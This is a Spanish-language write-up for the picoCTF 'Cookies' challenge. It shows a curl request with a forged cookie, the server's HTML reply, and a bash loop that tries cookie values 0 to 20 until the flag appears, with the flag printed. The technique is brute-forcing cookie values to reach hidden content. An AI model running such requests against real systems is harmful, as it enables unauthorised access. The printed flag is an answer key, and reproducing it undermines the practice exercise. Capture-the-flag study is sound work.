## Descripción
```
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)
```
## Solución
```
porti_04@DESKTOP-8HT902T:~$ curl http://mercury.picoctf.net:29649/check -H "Cookie: name=1"
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->


        <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">
          <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            </div>



        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
    <script>
    $(document).ready(function(){
        $(".close").click(function(){
            $("myAlert").alert("close");
        });
    });
    </script>
</body>
porti_04@DESKTOP-8HT902T:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>
porti_04@DESKTOP-8HT902T:~$

flag: picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}

```

## Notas 
```
- Usa un bucle `for` para iterar de 0 a 20.
- En cada iteración, envía una solicitud `curl` al servidor, usando el valor de `i` como parte de la cookie (`name=$i`).
- Filtra las respuestas para mostrar solo las que contienen `picoCTF` usando `grep`.

Es una forma de automatizar solicitudes y buscar una respuesta específica en las respuestas del servidor.
```

## Referencias
````

```
